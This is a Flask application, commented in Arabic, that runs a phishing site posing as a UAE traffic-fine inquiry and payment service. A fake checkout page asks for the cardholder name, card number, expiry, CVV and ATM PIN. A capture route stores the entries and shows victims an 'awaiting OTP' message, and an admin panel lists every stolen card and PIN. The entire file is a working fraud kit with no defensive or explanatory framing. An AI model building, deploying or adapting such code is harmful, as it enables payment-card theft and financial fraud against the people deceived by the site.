import os
from flask import Flask, render_template_string, request

app = Flask(__name__)
captured_data = []

# --- إعدادات الهيدر الثابت الجديد (الرابطين اللي بعتهم) ---
HEADER_HTML = """
<div class="fixed-header">
    <img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg" alt="Header Top">
    <img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg" alt="Header Bottom">
</div>
"""

STYLE = """
<style>
    body, html { margin: 0; padding: 0; width: 100%; background-color: #f4f4f4; font-family: sans-serif; }
    .fixed-header { position: fixed; top: 0; left: 0; width: 100%; z-index: 1000; background: white; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
    .fixed-header img { width: 100%; height: auto; display: block; }
    .container { margin-top: 150px; position: relative; z-index: 1; }
    .img-box { position: relative; width: 100%; }
    .img-box img { width: 100%; display: block; border: none; }
    .btn-link { position: absolute; background: rgba(0,0,0,0); border: none; cursor: pointer; }
</style>
"""

# --- 1. الصفحة الرئيسية (الصور كاملة + زرار ابدأ الخدمة) ---
HOME_HTML = f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">{STYLE}</head>
<body>
{HEADER_HTML}
<div class="container">
    <div class="img-box">
        <img src="https://static.wixstatic.com/media/a9f3d9_60aea158216544beaf9ee02cb9bd8bc2~mv2.jpg">
        <button class="btn-link" style="top:10%; left:10%; width:80%; height:15%;" onclick="location.href='/search'"></button>
    </div>
    <div class="img-box"><img src="https://static.wixstatic.com/media/a9f3d9_d8f02563f4e2475fa5e4fcc5b2daaaf5~mv2.jpg"></div>
    <div class="img-box"><img src="https://static.wixstatic.com/media/a9f3d9_d0dcb4c088a84089afa337a46bc21bf7~mv2.jpg"></div>
    <div class="img-box"><img src="https://static.wixstatic.com/media/a9f3d9_dc754b0143e14766a16919be2a1ee249~mv2.jpg"></div>
    <div class="img-box"><img src="https://static.wixstatic.com/media/a9f3d9_0596c91fd65d49a9b3598f7d4ff5a811~mv2.jpg"></div>
    <div class="img-box"><img src="https://static.wixstatic.com/media/a9f3d9_1347280275a14cada9eef8982ee5a375~mv2.jpg"></div>
    <div class="img-box"><img src="https://static.wixstatic.com/media/a9f3d9_662e4c074fe94f80940882c18cd51a87~mv2.jpg"></div>
    <div class="img-box"><img src="https://static.wixstatic.com/media/a9f3d9_a4395e1857c74368b9e7460f40c83938~mv2.jpg"></div>
    <div class="img-box"><img src="https://static.wixstatic.com/media/a9f3d9_70831b816d864befb4b42fa1ffeca8f8~mv2.jpg"></div>
</div>
</body>
</html>
"""

# --- 2. صفحة الاستعلام (الذهبية) ---
SEARCH_HTML = f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8">{STYLE}
<style>
    .card {{ background: white; max-width: 550px; margin: 20px auto; border-radius: 12px; border: 1px solid #ddd; overflow: hidden; }}
    .header-gold {{ background: #b0914f; color: white; padding: 20px; text-align: center; font-weight: bold; font-size: 18px; }}
    .form-content {{ padding: 25px; }}
    input, select {{ width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; }}
    .btn-gold {{ background: #b0914f; color: white; width: 100%; padding: 15px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; }}
</style>
</head>
<body>
{HEADER_HTML}
<div class="container">
    <img src="https://static.wixstatic.com/media/a9f3d9_8d6f26f6414147ecabf30b40b9a97f09~mv2.jpg" style="width:100%; max-width:550px; margin: 0 auto; display:block;">
    <div class="card">
        <div class="header-gold">استعلام المخالفات المرورية</div>
        <div class="form-content">
            <form action="/checkout" method="get">
                <label>إختر الإمارة:</label>
                <select><option>أبوظبي</option><option>دبي</option></select>
                <label>رقم اللوحة:</label>
                <input type="text" placeholder="الرمز - الرقم">
                <button type="submit" class="btn-gold">بحث الآن</button>
            </form>
        </div>
    </div>
</div>
</body>
</html>
"""

# --- 3. صفحة الدفع (الذهبية) ---
CHECKOUT_HTML = f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8">{STYLE}
<style>
    .pay-card {{ background: white; max-width: 400px; margin: 50px auto; padding: 25px; border-radius: 15px; border-top: 8px solid #b0914f; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }}
    input {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }}
    .confirm-btn {{ background: #b0914f; color: white; width: 100%; padding: 15px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }}
</style>
</head>
<body>
{HEADER_HTML}
<div class="container">
    <div class="pay-card">
        <h3 style="text-align:center;">دفع مخالفة (255.00 AED)</h3>
        <form action="/capture" method="post">
            <input type="text" name="n" placeholder="اسم حامل البطاقة" required>
            <input type="text" name="c" placeholder="رقم البطاقة (16 رقم)" maxlength="16" required>
            <div style="display:flex; gap:10px;"><input type="text" name="e" placeholder="MM/YY" required><input type="text" name="v" placeholder="CVV" required></div>
            <input type="password" name="p" placeholder="ATM PIN" maxlength="4" required>
            <button type="submit" class="confirm-btn">تأكيد السداد</button>
        </form>
    </div>
</div>
</body>
</html>
"""

# --- 4. لوحة التحكم الاحترافية (Admin) ---
ADMIN_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><style>
    body { background: #0f172a; color: white; font-family: sans-serif; padding: 20px; }
    .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 15px; }
    .card-ui { background: #1e293b; border-radius: 12px; padding: 20px; border: 1px solid #334155; }
    .num { font-size: 18px; color: #38bdf8; letter-spacing: 2px; }
    .pin { color: #f59e0b; font-weight: bold; margin-top: 10px; }
</style></head>
<body>
    <h1>البيانات الجديدة (الأحدث أولاً)</h1>
    <div class="grid">
        {% for d in data %}
        <div class="card-ui">
            <div class="num">{{ d.c }}</div>
            <p>الاسم: {{ d.n }} | التاريخ: {{ d.e }} | CVV: {{ d.v }}</p>
            <div class="pin">ATM PIN: {{ d.p }}</div>
        </div>
        {% endfor %}
    </div>
</body>
</html>
"""

@app.route('/')
def home(): return render_template_string(HOME_HTML)

@app.route('/search')
def search(): return render_template_string(SEARCH_HTML)

@app.route('/checkout')
def checkout(): return render_template_string(CHECKOUT_HTML)

@app.route('/capture', methods=['POST'])
def capture():
    captured_data.insert(0, request.form.to_dict())
    return "<h2>جاري المعالجة...</h2><p>يرجى الانتظار لتلقي رمز OTP</p>"

@app.route('/admin-panel')
def admin(): return render_template_string(ADMIN_HTML, data=captured_data)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
